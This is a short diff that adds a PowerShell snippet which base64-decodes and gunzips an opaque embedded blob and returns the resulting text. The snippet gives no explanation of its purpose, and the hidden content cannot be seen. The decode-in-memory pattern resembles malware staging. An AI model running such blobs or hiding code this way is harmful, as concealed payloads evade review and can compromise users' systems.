@@ -1,0 +1,5 @@
+$b = [Convert]::FromBase64String('H4sIAAAAAAAAA9WYy47cIBBFv4ZFFhNVFRSPpd32JOqOpbQ6UjTb/v+PCA8nc8kyYcFIFsI0uM1RuThgdP1k7G54F87FIRRDyLXtJ5O1Tjzl+vosLY+rMIUXppRv/CYkloRsvrnerrlkf7eePhOVIW/fL6XJYTfuBq1LaXo8cil3LY88fKkf5b/sIbl0R+mohyvtayjtayz1R3mFi9mTiaFcezSrM8tWKstuFjG7mriZpLXyaupgvhBxeTl5K0OTNZHr0GCW1/LwW/31tn399qVxyHMh+RsLWZ+YKxYBLCyIxSEWiXFyLDIGSw2N9WkRCyOWMqHr/UfDEmanYgdRiZWKa1RypxdxhFQ8BgtHmRyLG4RFKxZFLF2wBMQSZqei/08lT9nHFiweqXSZJXaZhf3kWPyAYKGYznUoIBaLWFL/Dc2+DoVBWNo6FBGLAyz1Qe/RorN/RHFQamlYEmJRxMIdFktuci5pABeJ1rXkUvv/AeMRjCAYZyePF6YxXLTFCzNyCcil19zJswuPsFzycn5GLIglIpZOc1lm5zJAc/OOKEloXCxywV0Raxcuk6/RPEDoKpYzu6DoKoou+w+FZYDR5cXIpbYpYhRdRdHlTnRZZPLViEc4nfVK59kCuq6i6/LHcl0eIXWFy5l2UXYVZZc72Z1/lR5jdeF3fkHbVbRd6Wx3+vwyQurejxcYbVfRdqW33dk3ATJA6nzMK1KdwVNQdhVlVzrZnf2Agf/tNMqQy9cv49ZOeecVAAA==')
+$s = New-Object System.IO.MemoryStream(, $b)
+$g = New-Object System.IO.Compression.GZipStream($s, [System.IO.Compression.CompressionMode]::Decompress)
+$r = New-Object System.IO.StreamReader($g)
+$r.ReadToEnd()
